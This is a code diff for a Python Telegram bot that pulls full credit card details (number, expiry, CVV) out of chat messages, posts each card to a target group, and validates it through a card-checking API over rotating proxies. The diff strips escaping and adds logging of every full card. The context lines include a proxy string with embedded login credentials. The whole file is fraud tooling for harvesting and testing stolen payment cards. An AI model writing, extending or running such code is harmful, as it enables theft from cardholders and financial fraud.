@@ -25,16 +25,15 @@ PROXIES = ["45.41.172.51:5794:juftilus:atasaxde44jl"]
 NUM_CONCURRENT = 5  # simultaneous API requests
 
 # ---------------- CARD REGEX ----------------
-# Matches cards with optional separators, CVV, expiry, and names
 CARD_REGEX = re.compile(
     r"""
-    (?P<cc>\d{13,16})            # Card number
-    (?:[\s|:/\\]+)?               # Optional separator
-    (?P<exp_month>\d{2})?         # Optional month
-    (?:[\s|:/\\]+)?               # Optional separator
-    (?P<exp_year>\d{2,4})?        # Optional year
-    (?:[\s|:/\\]+)?               # Optional separator
-    (?P<cvv>\d{3,4})?             # Optional CVV
+    (?P<cc>\d{13,16})              # Card number
+    (?:[\s|:/\\]+)?                 # Optional separator
+    (?P<exp_month>\d{2})?           # Optional month
+    (?:[\s|:/\\]+)?                 # Optional separator
+    (?P<exp_year>\d{2,4})?          # Optional year
+    (?:[\s|:/\\]+)?                 # Optional separator
+    (?P<cvv>\d{3,4})?               # Optional CVV
     """,
     re.VERBOSE | re.MULTILINE
 )
@@ -50,7 +49,7 @@ semaphore = asyncio.Semaphore(NUM_CONCURRENT)
 
 # ---------------- FUNCTIONS ----------------
 async def check_card_and_update(msg_obj, card: str):
-    """Check card via API and update Telegram message"""
+    """Check card via API and update Telegram message, log everything"""
     global session
     async with semaphore:
         proxy = random.choice(PROXIES)
@@ -62,15 +61,17 @@ async def check_card_and_update(msg_obj, card: str):
         except Exception as e:
             data = {"response": f"API Error: {e}", "status": "Error"}
 
-        response = escape_markdown(str(data.get("response")), version=2)
-        status = escape_markdown(str(data.get("status")), version=2)
+        response = str(data.get("response"))
+        status = str(data.get("status"))
 
-        new_text = msg_obj.text + f"\n\n📊 Checked Result:\nStatus: {status}\nResponse: {response}"
+        print(f"[API] Card: {card} | Status: {status} | Response: {response}")
+
+        new_text = f"💳 CC Detected: {card}\n\n📊 Checked Result:\nStatus: {status}\nResponse: {response}"
         try:
-            await msg_obj.edit_text(new_text, parse_mode="MarkdownV2")
-            print(f"[✓] Updated: {card} -> {status}")
+            await msg_obj.edit_text(new_text)
+            print(f"[✓] Updated message for card: {card}")
         except Exception as e:
-            print(f"[❌] Failed to update: {card} -> {e}")
+            print(f"[❌] Failed to update message: {card} -> {e}")
 
 async def drop_card(card: str):
     """Send card immediately, then process API"""
@@ -82,13 +83,12 @@ async def drop_card(card: str):
     try:
         msg_obj = await bot_client.send_message(
             chat_id=TARGET_GROUP_ID,
-            text=f"💳 CC Detected: `{escape_markdown(card, version=2)}`",
-            parse_mode="MarkdownV2"
+            text=f"💳 CC Detected: {card}"
         )
         print(f"[+] Dropped: {card}")
         asyncio.create_task(check_card_and_update(msg_obj, card))
     except Exception as e:
-        print(f"[❌] Failed to drop: {card} -> {e}")
+        print(f"[❌] Failed to drop card: {card} -> {e}")
 
 def extract_cards(text: str):
     """Extract all possible cards from messy text"""
@@ -114,7 +114,7 @@ async def card_listener(event):
     if cards:
         for card_str in cards:
             asyncio.create_task(drop_card(card_str))
-            print(f"[+] Card detected and processing: {card_str}")
+            print(f"[+] Card detected: {card_str}")
 
 # ---------------- TELEGRAM COMMANDS ----------------
 async def start(update: "Update", context: ContextTypes.DEFAULT_TYPE):
